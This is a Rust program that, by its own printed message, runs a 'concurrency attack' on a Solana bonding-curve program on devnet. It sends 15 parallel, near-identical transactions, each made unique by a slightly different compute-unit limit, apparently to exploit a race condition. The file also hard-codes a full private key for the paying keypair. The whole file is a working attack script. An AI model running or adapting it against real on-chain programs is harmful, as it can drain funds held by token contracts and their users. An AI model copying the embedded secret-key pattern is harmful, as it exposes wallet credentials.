use solana_client::nonblocking::rpc_client::RpcClient;
use solana_sdk::{
    commitment_config::CommitmentConfig,
    compute_budget::ComputeBudgetInstruction,
    instruction::{AccountMeta, Instruction},
    message::Message,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use std::str::FromStr;
use std::sync::Arc;
use tokio::task;


#[tokio::main]
async fn main() {
    let payer = Keypair::from_base58_string("4NCBRf1QZ43Ahx9z9nSnRi9TkN79ba6yHndH8V9hNRauhhSiVRfEvrGHTC8GHiCYWQNTvTTUWSjjVbjg2DUZp5ho");
    let payer_arc = Arc::new(payer);
    
    let rpc_url = "https://api.devnet.solana.com".to_string();
    let client = Arc::new(RpcClient::new_with_commitment(rpc_url, CommitmentConfig::confirmed()));


    let program_id = Pubkey::from_str("6WSsUceUttSpcy8P5ofy5cYDG6pyYLWRz3XTnx95EJWh").unwrap();


    let accounts = vec![
        AccountMeta::new(payer_arc.pubkey(), true),
        AccountMeta::new(Pubkey::from_str("917G75v47BCaVhJqNyw42uANrSXYciRfJn9YGRJW1DUM").unwrap(), false),
        AccountMeta::new(Pubkey::from_str("8Utco34RpqtXADtFet7NweYmkfgLqEJixnEnf1aTF4qm").unwrap(), false),
        AccountMeta::new(Pubkey::from_str("FUHuMu92MStbFQLAnoKok9aSQwXdwG7gkFnbaoY3ja7X").unwrap(), false),
        AccountMeta::new(Pubkey::from_str("Eh243Es7rHzMx62GFRoGQWfGXXrakd3A3rx5Tk1iAzDB").unwrap(), false),
        AccountMeta::new(Pubkey::from_str("G6Miqs4m2maHwj91YBCboEwY5NoasLVwL3woVXh2gXjM").unwrap(), false),
        AccountMeta::new(Pubkey::from_str("6G84XmfL4d15CvMUXfH9iLJep9eSxHGS3UycvG6N8155").unwrap(), false),
        AccountMeta::new_readonly(Pubkey::from_str("11111111111111111111111111111111").unwrap(), false),
        AccountMeta::new_readonly(Pubkey::from_str("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").unwrap(), false),
        AccountMeta::new_readonly(Pubkey::from_str("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL").unwrap(), false),
    ];


    let instruction_data = vec![
        0x66, 0x06, 0x3d, 0x12, 0x01, 0xda, 0xeb, 0xea,
        0x00, 0xe1, 0xf5, 0x05, 0x00, 0x00, 0x00, 0x00,
        0xf5, 0x8f, 0x79, 0x6c, 0x3e, 0x02, 0x00, 0x00,
    ];


    let instruction = Instruction {
        program_id,
        accounts,
        data: instruction_data,
    };


    println!("Starting concurrency attack on the bonding curve...");


    let mut handles = vec![];


    for i in 0..15 {
        let client_clone = Arc::clone(&client);
        let payer_clone = Arc::clone(&payer_arc);
        let inst_clone = instruction.clone();


        let handle = task::spawn(async move {
            let recent_blockhash = client_clone.get_latest_blockhash().await.unwrap();
            
            // Forces a unique hash in the transaction by varying the compute limit
            let compute_inst = ComputeBudgetInstruction::set_compute_unit_limit(200_000 + i as u32);
            
            let message = Message::new(&[compute_inst, inst_clone], Some(&payer_clone.pubkey()));
            let mut tx = Transaction::new(&[&*payer_clone], message, recent_blockhash);


            match client_clone.send_and_confirm_transaction(&tx).await {
                Ok(sig) => println!("Thread {} | Success: {}", i, sig),
                Err(e) => println!("Thread {} | Failed: {}", i, e),
            }
        });
        handles.push(handle);
    }


    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Test finished. Check the output.");
}